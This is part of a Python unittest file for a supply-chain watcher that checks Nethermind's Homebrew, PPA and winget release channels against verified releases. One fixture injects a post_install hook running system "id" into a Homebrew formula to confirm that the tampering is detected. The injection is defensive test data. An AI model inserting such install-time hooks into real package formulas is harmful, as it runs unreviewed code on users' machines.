        self.assertEqual(self.fails("homebrew", {**hb, "tap": self.tap()}), [])
        shadow = self.tap()
        shadow["tree"]["Formula/nethermind.rb"] = ["blob", "y"]
        self.assertIn("Formula/nethermind.rb", self.fails("homebrew", {**hb, "tap": shadow})[0].message)
        self.assertIn("default branch", self.fails("homebrew", {**hb, "tap": self.tap(default_branch="evil")})[0].message)

    def test_formula_outside_the_window_is_still_template_checked(self):
        hb = copy.deepcopy(self.snap["channels"]["homebrew"])
        hb["text"] = hb["text"].replace("2.2.0", "2.1.0").replace("  test do", "  post_install do\n    system \"id\"\n  end\n\n  test do")
        hb["version"] = "2.1.0"
        self.snap["tags"]["2.1.0"] = {"object": "a" * 40, "type": "tag", "commit": "a" * 40}
        checks = {r.check for r in self.fails("homebrew", {**hb, "tap": self.tap()})}
        self.assertIn("channel-content", checks)

    def test_unknown_or_rolled_back_formula_version_fails(self):
        hb = {**self.snap["channels"]["homebrew"], "tap": self.tap(), "version": "2.99.0"}
        self.assertIn("channel-version", {r.check for r in self.fails("homebrew", hb)})
        self.snap["releases"]["2.3.0"] = release("2.3.0", C230, 3)
        trusted = {"2.3.0": {"version": "2.3.0", "commit": C230, "outcome": "pass", "coverage": {"source": "signed", "packages": {}, "images": {}}}}
        msgs = [r.message for r in self.fails("homebrew", {**self.snap["channels"]["homebrew"], "tap": self.tap()}, trusted)]
        self.assertTrue(any("older than the newest trusted release 2.3.0" in m for m in msgs), msgs)

    def test_malformed_formula_fails(self):
        [r] = self.fails("homebrew", {"tap": self.tap(), "version": None, "entries": [], "text": "x", "malformed": "sha256 without a preceding url"})
        self.assertEqual(r.check, "channel-content")


class PendingVerificationTest(unittest.TestCase):
    """Channel uploads of a release that `verify` has not reached yet are WARN, not FAIL."""

    def setUp(self):
        self.p = load("nethermind")
        self.ch = {c["type"]: c for c in self.p.channels}
        self.snap = snapshot()
        self.snap["releases"]["2.3.0"] = release("2.3.0", C230, 3)
        self.snap["tags"]["2.3.0"] = {"object": C230, "type": "commit", "commit": C230}

    def results(self, ctype, data, verified):
        return [r for r in watch.evaluate_channel(self.p, self.snap, verified, self.ch[ctype], data) if r.check == "channel-version"]

    def test_ppa_upload_before_verify_warns_and_failed_verify_fails(self):
        data = {"sources": {"2.3.0": {"series": ["jammy"], "not_fetched": True}}, "other_packages": {}}
        [r] = self.results("ppa", data, {})
        self.assertEqual((r.status, r.message), (Status.WARN, "pending verification of 2.3.0; run verify"))
        [r] = self.results("ppa", data, {"2.3.0": {"version": "2.3.0", "commit": C230, "outcome": "fail"}})
        self.assertEqual(r.status, Status.FAIL)

    def test_winget_manifest_before_verify_warns(self):
        entries = [{"arch": "x64", "url": f"https://github.com/NethermindEth/nethermind/releases/download/2.3.0/nethermind-2.3.0-{C230[:8]}-windows-x64.zip",
                    "sha256": "5" * 64}]
        data = {"listed": ["2.3.0"], "manifests": {"2.3.0": {"entries": entries, "fields": {}}}}
        [r] = self.results("winget", data, {})
        self.assertEqual(r.status, Status.WARN)

    def test_homebrew_behind_a_freshly_trusted_release_warns_then_fails(self):
        hb = {**self.snap["channels"]["homebrew"], "tap": None}
        rec = {"version": "2.3.0", "commit": C230, "outcome": "pass", "coverage": {"source": "signed", "packages": {}, "images": {}}}
        now = utc_now()
        [r] = self.results("homebrew", hb, {"2.3.0": {**rec, "verified_at": now}})
        self.assertEqual(r.status, Status.WARN)
        [r] = self.results("homebrew", hb, {"2.3.0": {**rec, "verified_at": "2026-01-01T00:00:00Z"}})
        self.assertEqual(r.status, Status.FAIL)


if __name__ == "__main__":
    unittest.main()
